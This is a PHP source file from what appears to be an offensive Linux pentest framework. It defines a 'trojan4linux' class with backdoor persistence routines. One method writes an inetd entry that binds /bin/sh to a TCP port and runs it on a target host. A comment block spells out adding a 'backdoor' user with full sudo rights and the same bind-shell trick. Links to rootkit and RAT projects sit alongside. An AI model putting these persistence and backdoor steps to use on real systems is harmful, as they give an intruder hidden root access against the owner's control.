<?php 




class trojan4linux extends inject4linux{

  

    public function __construct($stream,$eth,$domain,$ip,$port,$protocol) {
        parent::__construct($stream,$eth,$domain,$ip,$port,$protocol);
    }
    
    // https://github.com/n1nj4sec/pupy
    // https://github.com/r00tkillah/HORSEPILL
    // http://r00tkit.me/
    // https://kalilinuxtutorials.com/cymothoa/
    // https://blog.barradell-johns.com/index.php/2018/09/04/pinkys-palace-v3-writeup/
    

    
    
    public function backdoor_linux_persistance($stream) {
        $this->ssTitre(__FUNCTION__);
        /*
         * at : programme une tache à exécuter à une heure ultérieure ex : at 18:22 ou at now + 5hours puis ctlr D
         * atq : lister les jobs en attente
         * atrm : supr jobs
         */
        $this->article("Test","Pick an obscure service from /etc/services associated with a tcp port 1024 and above…for example laplink");
        $this->requette("echo \"laplink $this->attacker_port/tcp # laplink\nlaplink stream tcp nowait /bin/sh bash -i\nrestart inetd.conf\nkillall -HUP inetd\" > $this->file_path");
        //$victime = new vm($this->target_vmx_name);
        //$victime->vm2upload($this->file_path, "$this->vm_tmp_lin/$this->file_ext");
        $this->cmd($this->target_ip,"bash $this->vm_tmp_lin/$this->file_ext");
        //$this->
    }
    
    
    
    public function lan2root2rat(){
        
        // https://github.com/n1nj4sec/pupy
        // https://github.com/r00tkillah/HORSEPILL
        // http://r00tkit.me/
        // https://kalilinuxtutorials.com/cymothoa/
        // https://blog.barradell-johns.com/index.php/2018/09/04/pinkys-palace-v3-writeup/
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        /*
         Backdooring Linux
         + Adding a backdoor user (super visible to sysadmin)
         Adding users
         
         /usr/sbin/adduser backdoor
         passwd backdoor
         echo "backdoor ALL=(ALL) ALL" >> /etc/sudoers
         
         Pick an obscure service from /etc/services associated with a tcp port 1024 and above...for example laplink
         laplink         1547/tcp     # laplink
         Add the following line to /etc/inetd.conf
         laplink    stream  tcp     nowait  /bin/sh bash -i
         restart inetd.conf
         killall -HUP inetd
         Explaination: You are creating a listener on port tcp/1547 that will shovel you a bash shell. Caveat: this obviously is not my *idea* It's just very VERY old stuff that still works.
         
         */
        return $result ;
    }
    
    
    
}
?>